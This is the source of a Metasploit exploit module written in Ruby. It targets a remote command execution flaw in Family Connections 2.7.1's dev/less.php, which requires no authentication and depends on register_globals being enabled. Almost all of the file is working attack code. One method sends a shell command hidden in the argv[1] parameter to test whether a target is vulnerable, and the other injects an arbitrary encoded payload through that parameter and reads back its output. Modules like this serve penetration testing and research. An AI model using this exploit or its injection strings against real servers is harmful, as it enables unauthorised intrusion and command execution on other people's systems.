# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Family Connections less.php Remote Command Execution&#039;,
            &#039;Description&#039;    => %q{
                This module exploits an arbitrary command execution vulnerability in
                Family Connections 2.7.1. It&#039;s in the dev/less.php script and is due
                to an insecure use of system().  Authentication isn&#039;t required to exploit
                the vulnerability but register_globals must be set to On.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;mr_me <steventhomasseeley[at]gmail.com>&#039;, # Vulnerability discovery and exploit
                    &#039;juan vazquez&#039;  # Metasploit module
                ],
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;https://www.familycms.com/blog/2011/11/security-vulnerability-fcms-2-5-2-7-1/&#039; ],
                    [ &#039;URL&#039;, &#039;http://sourceforge.net/apps/trac/fam-connections/ticket/407&#039; ],
                    [ &#039;URL&#039;, &#039;http://rwx.biz.nf/advisories/fc_cms_rce_adv.html&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/18198/&#039; ]
                ],
            &#039;Privileged&#039;     => false,
            &#039;Payload&#039;        =>
                {
                    &#039;Compat&#039;     =>
                    {
                        &#039;PayloadType&#039;  => &#039;cmd&#039;,
                        &#039;RequiredCmd&#039;  => &#039;generic telnet perl ruby&#039;,
                    }
                },
            &#039;Platform&#039;       => [&#039;unix&#039;, &#039;linux&#039;],
            &#039;Arch&#039;           => ARCH_CMD,
            &#039;Targets&#039;        => [[&#039;Automatic&#039;,{}]],
            &#039;DisclosureDate&#039; => &#039;Nov 29 2011&#039;,
            &#039;DefaultTarget&#039;  => 0
        ))
 
        register_options(
            [
                OptString.new(&#039;URI&#039;, [true, "The path to the Family Connections main site", "/fcms/"]),
            ],self.class)
    end
 
    def check
        uri = datastore[&#039;URI&#039;]
        uri += (datastore[&#039;URI&#039;][-1, 1] == "/") ? "dev/less.php" : "/dev/less.php"
 
        mark = Rex::Text.rand_text_alpha(rand(5) + 5)
 
        res = send_request_cgi({
            &#039;uri&#039;       => uri,
            &#039;vars_get&#039;  => { &#039;argv[1]&#039; => "|echo #{mark};#" }
        }, 25)
 
        if res and res.code == 200 and res.body =~ /#{mark}/
            return Exploit::CheckCode::Vulnerable
        end
 
        return Exploit::CheckCode::Safe
    end
 
    def exploit
        uri = datastore[&#039;URI&#039;]
        uri += (datastore[&#039;URI&#039;][-1, 1] == "/") ? "dev/less.php" : "/dev/less.php"
 
        start_mark = Rex::Text.rand_text_alpha(rand(5) + 5)
        end_mark  = Rex::Text.rand_text_alpha(rand(5) + 5)
        custom_payload = "|echo #{start_mark};#{payload.encoded};echo #{end_mark};#"
 
        res = send_request_cgi({
            &#039;uri&#039;       => uri,
            &#039;vars_get&#039;  => { &#039;argv[1]&#039; => custom_payload }
        }, 25)
 
        if res and res.code == 200 and res.body =~ /#{start_mark}/
            # Prints output when using cmd/unix/generic
            result = res.body.split(/#{start_mark}/)[1].split(/#{end_mark}/)[0]
            if not result.strip.empty?
                print_status("Result of the command:\n#{result}")
            end
        end
    end
 
end



